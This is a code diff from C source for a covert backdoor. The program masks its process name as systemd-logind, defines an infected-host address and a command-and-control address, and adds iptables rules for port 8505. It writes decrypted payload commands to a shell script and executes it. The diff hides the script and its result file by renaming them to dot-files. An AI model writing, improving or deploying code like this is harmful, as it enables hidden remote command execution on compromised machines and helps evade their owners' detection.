@@ -7,14 +7,14 @@
 #define SPORT 22
 #define BUFFERSIZE 1024
 #define MASK "/usr/lib/systemd/systemd-logind"
-#define CMD "./cmd.sh > results"
-#define CHMOD "chmod 755 cmd.sh"
+#define CMD "./.cmd.sh > .results"
+#define CHMOD "chmod 755 .cmd.sh"
 #define IPTABLES(ip) "iptables -A OUTPUT -p tcp -d " ip " --dport 8505 -j ACCEPT"
 #define TURNOFF(ip) "iptables -D OUTPUT -p tcp -d " ip " --dport 8505 -j ACCEPT"
-#define RESULT_FILE "results"
+#define RESULT_FILE ".results"
 #define INFECTEDIP "192.168.0.100"
 #define CNCIP "192.168.0.109"
-
+#define FILENAME ".cmd.sh"
 struct payload{
     char key[5]; // always 8505
     char buffer[1024]; // for either commands or results
@@ -248,7 +248,7 @@ void ParsePayload(const u_char *payload, int len){
     unsigned char decryptedtext[BUFSIZE+16];
     int decryptedlen, cipherlen;
 
-    if((fp = fopen("cmd.sh", "wb+")) < 0){
+    if((fp = fopen(FILENAME, "wb+")) < 0){
         perror("fopen");
         exit(1);
     }
